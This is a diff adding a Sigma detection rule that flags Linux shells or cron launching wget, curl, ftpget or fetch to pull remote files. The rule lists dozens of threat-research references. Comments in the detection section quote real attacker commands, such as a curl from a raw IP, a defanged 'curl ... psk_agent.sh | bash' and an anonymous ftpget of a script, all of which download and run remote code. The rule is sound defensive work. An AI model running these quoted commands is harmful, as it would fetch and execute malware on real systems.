@@ -1,0 +1,139 @@
+id: YEF0Fj5UUDHn
+name: Remote File Upload / Download via Standard Tools (via cmdline)
+body: |-
+  title: Remote File Upload / Download via Standard Tools (via cmdline)
+  id: 66b6f425-42f0-484d-b242-64211239f5d0
+  status: stable
+  description: Fetch a remote file via standard file download tool.
+  author: SOC Prime Team
+  references:
+      - https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/
+      - https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
+      - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
+      - https://hunt.io/blog/ukraine-state-data-exchange-graylog-log4shell
+      - https://www.esentire.com/blog/more-shells-than-a-seafood-buffet-tracking-citrix-netscaler-exploitation-activities-cve-2026-88771
+      - https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure
+      - https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-renewed-mass-exploitation-campaign-targeting-oracle-peoplesoft/
+      - https://www.fortinet.com/blog/threat-research/multi-functional-linux-botnet-evooo1bot
+      - https://medium.com/@quirso_de/global-exploitation-of-cve-2026-59310-by-suspected-chinese-nexus-apt-related-cve-2026-59309-443a79e1466d
+      - https://cert.gov.ua/article/6318863
+      - https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
+      - https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
+      - https://www.trendmicro.com/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html
+      - https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
+      - https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
+      - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions?utm_medium=feed
+      - https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/
+      - https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm
+      - https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
+      - https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
+      - https://www.ox.security/blog/new-actors-deploy-shai-hulud-clones-teampcp-copycats-are-here/
+      - https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html
+      - https://research.jfrog.com/post/shai-hulud-here-we-go-again/
+      - https://opensourcemalware.com/blog/dprk-git-hooks-malware
+      - https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
+      - https://isc.sans.edu/diary/rss/32936
+      - https://snyk.io/blog/malicious-release-of-elementary-data-pypi-package-steals-cloud-credentials-from-data-engineers/
+      - https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
+      - https://research.jfrog.com/post/xinference-compromise/s
+      - https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware
+      - https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
+      - https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
+      - https://socket.dev/blog/axios-npm-package-compromised
+      - https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
+      - https://thehackernews.com/2026/03/north-korean-hackers-publish-26-npm.html
+      - https://kmsec.uk/blog/dprk-text-steganography/
+      - https://x.com/ESETresearch/status/1960365364300087724
+      - https://www.linkedin.com/posts/anton-cherepanov-b8653276_promptlock-activity-7366142680097017856-bVVY/
+      - https://app.any.run/tasks/d0813b09-19f3-422c-8066-39d53c2eeead
+      - https://threadreaderapp.com/thread/1960365364300087724.html
+      - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a
+      - https://www.labs.greynoise.io/grimoire/2024-03-confluence-where-are-they-now/
+      - https://research.checkpoint.com/2024/magnet-goblin-targets-publicly-facing-servers-using-1-day-vulnerabilities/
+      - https://www.rapid7.com/blog/post/2023/11/06/etr-rapid7-observed-exploitation-of-atlassian-confluence-cve-2023-22518/
+      - https://gbhackers.com/skidmap-malware-attacking-linux-distributions/
+      - https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/
+      - https://github.com/hieuminhnv/CVE-2022-21587-POC/blob/main/exploit.py
+      - https://www.rapid7.com/blog/post/2023/02/07/etr-cve-2022-21587-rapid7-observed-exploitation-of-oracle-e-business-suite-vulnerability/
+      - https://hybrid-analysis.com/sample/f2e963dd8e751127369384ed8c49e9f37357c6db65731325f3e46643d23a8d10?environmentId=300
+      - https://www.cadosecurity.com/migo-a-redis-miner-with-novel-system-weakening-techniques/
+      - https://nao-sec.org/2024/10/IcePeony-with-the-996-work-culture.html
+      - https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures
+      - https://www.cert.ssi.gouv.fr/cti/CERTFR-2025-CTI-009/
+      - https://www.wiz.io/blog/exposed-jdwp-exploited-in-the-wild
+      - https://www.aquasec.com/blog/ai-generated-malware-in-panda-image-hides-persistent-linux-threat/
+      - https://www.darktrace.com/blog/auto-color-backdoor-how-darktrace-thwarted-a-stealthy-linux-intrusion
+      - https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet
+      - https://www.sentinelone.com/blog/defending-against-sha1-hulud-the-second-coming/
+      - https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
+      - https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html
+      - https://gist.github.com/joe-desimone/ff0cae0aa0d20965d502e7a97cbde3e3
+      - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
+      - https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks
+      - https://www.huntress.com/blog/peerblight-linux-backdoor-exploits-react2shell
+      - https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182/
+      - https://jp.security.ntt/insights_resources/tech_blog/react2shell_malware_zndoor/
+      - https://beelzebub.ai/blog/threat-huntinga-analysis-of-a-nextjs-exploit-campaign/
+      - https://detect.fyi/shai-hulud-2-0-campaign-be390e502f28
+      - https://www.huntress.com/blog/evolving-linux-threat-landscape
+      - https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
+  tags:
+      - attack.command_and_control
+      - attack.t1105
+  logsource:
+      category: process_creation
+      product: linux
+  detection:
+      selection:
+          ParentImage|endswith:
+              - 'sh' #bash / sh / zsh
+              - 'crond'
+          Image|endswith:
+              - 'wget' # https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
+              - 'curl' #curl -sL http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null; https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks; https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
+              - 'ftpget' #https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
+              - 'fetch' #fetch -o /tmp/1 hxxp://tnegadge[.]s3.amazonaws.com/dfuJ8t1uhG; https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
+      selection_action:
+          - CommandLine|contains:
+              - 'anonymous' #ftpget -v -u anonymous -p anonymous -P 21 xxx.xxx.xxx.xxx 2.sh 2.sh; https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
+          - CommandLine|contains|all:
+              - 'http'
+              - ' | ' #https://kmsec.uk/blog/dprk-text-steganography/; https://isc.sans.edu/diary/rss/32936; https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html; https://www.esentire.com/blog/more-shells-than-a-seafood-buffet-tracking-citrix-netscaler-exploitation-activities-cve-2026-88771
+          - CommandLine|contains|all:
+              - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://unit42.paloaltonetworks.com/modern-kubernetes-threats/; https://research.jfrog.com/post/xinference-compromise/; https://research.jfrog.com/post/shai-hulud-here-we-go-again/; https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo; https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
+              - ' -o ' #https://cert.gov.ua/article/6318863; https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure
+          - CommandLine|contains|all:
+              - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
+              - '/tmp' #https://socket.dev/blog/axios-npm-package-compromised; https://medium.com/@quirso_de/global-exploitation-of-cve-2026-59310-by-suspected-chinese-nexus-apt-related-cve-2026-59309-443a79e1466d; https://www.fortinet.com/blog/threat-research/multi-functional-linux-botnet-evooo1bot
+          - CommandLine|contains|all:
+              - 'file=@' #PromptLock pomt contains
+              - 'http'
+          - CommandLine|contains|all:
+              - 'ftp://'
+              - ' -o' # https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
+      selection_pipe:
+          CommandLine|contains|all:
+              - 'curl' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; curl -fsSL https://bun.sh/install | bash; https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
+              - 'http'
+              - 'bash' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
+      filters:
+          CommandLine|contains:
+              - 'apt-get'
+              - '_replication' #elasticsearch req.
+              - 'localhost'
+              - '127.0.0.1'
+              - '169.254.169.254'
+              - 'SPHardwareDataType' #system_profiler SPHardwareDataType | awk '/Serial/ {print $4}
+              - 'metadata.google.internal' #...lavor:Google' -O - http://metadata.google.internal/computeMetadata/v1/instance/id else c...
+              - 'update.code.visualstudio.com'
+              - 'dl.google.com'
+              - 'github'
+              - 'Homebrew'
+              - 'cookie' #.../Homebrew/shims/shared/curl --disable --cookie /dev/null --globoff --show-err...
+      condition: ((selection and selection_action) and not filters) or selection_pipe
+  falsepositives:
+      - Administrative activity
+  level: low
+level: low
+created: '2020-03-20T10:23:27Z'
+updated: '2026-11-03T10:22:44.965000Z'
